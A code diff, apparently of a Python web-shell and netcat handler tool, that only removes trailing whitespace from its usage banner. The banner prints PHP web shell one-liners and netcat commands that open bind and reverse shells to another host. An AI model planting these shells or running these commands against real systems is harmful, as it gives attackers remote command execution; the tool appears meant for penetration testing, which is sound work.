@@ -40,30 +40,30 @@ from core.libs.thirdparty.termcolor import cprint, colored
 
 if len(argv) <= 1:
     cprint("-- handler for PHP 'system functions' & also an alternative 'netcat' handler --\n", 'cyan')
-    
+
     cprint("--   PHP 'system functions' ~ Works for POST and GET requests   --", 'blue')
     cprint(" Target's side:", 'green')
     cprint("-   <?php system($_GET['parameter']); ?>", 'yellow')
     cprint("-   <?php passthru($_REQUEST['parameter']); ?>", 'yellow')
     cprint("-   <?php echo exec($_POST['parameter']); ?>", 'yellow')
-    cprint(" Example command:", 'green')    
-    cprint("-   python webhandler.py --url http://www.mywebsite.com/shell.php?cmd=\n", 'yellow')    
-    
+    cprint(" Example command:", 'green')
+    cprint("-   python webhandler.py --url http://www.mywebsite.com/shell.php?cmd=\n", 'yellow')
+
     cprint("--   Netcat ~ Listening server (for an bind connection)   --", 'blue')
-    cprint(" Example command:", 'green')    
-    cprint("-   WebHandler: python webhandler.py --listen 1234", 'yellow')    
-    cprint("-       netcat: nc -lp 1234", 'yellow')   
-    cprint(" Target's side:", 'green')    
-    cprint("-       nc mywebsite.com:1234 -e /bin/sh\n", 'yellow')   
+    cprint(" Example command:", 'green')
+    cprint("-   WebHandler: python webhandler.py --listen 1234", 'yellow')
+    cprint("-       netcat: nc -lp 1234", 'yellow')
+    cprint(" Target's side:", 'green')
+    cprint("-       nc mywebsite.com:1234 -e /bin/sh\n", 'yellow')
     # More examples: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
-        
+
     cprint("--   Netcat ~ Connecting client (for an reverse connection)   --", 'blue')
     cprint(" Target's side:", 'green')
     cprint("-   nc -lp 5678 -e /bin/bash", 'yellow')
-    cprint(" Example command:", 'green')    
-    cprint("-   WebHandler: python webhandler.py --connect mywebsite.com:5678", 'yellow')    
-    cprint("-       netcat: nc mywebsite.com:5678\n", 'yellow') 
-    
+    cprint(" Example command:", 'green')
+    cprint("-   WebHandler: python webhandler.py --connect mywebsite.com:5678", 'yellow')
+    cprint("-       netcat: nc mywebsite.com:5678\n", 'yellow')
+
     print "Run: " + colored("{0} -h".format(argv[0]), 'red') + " for help & more example commands"
     exit(1)
 
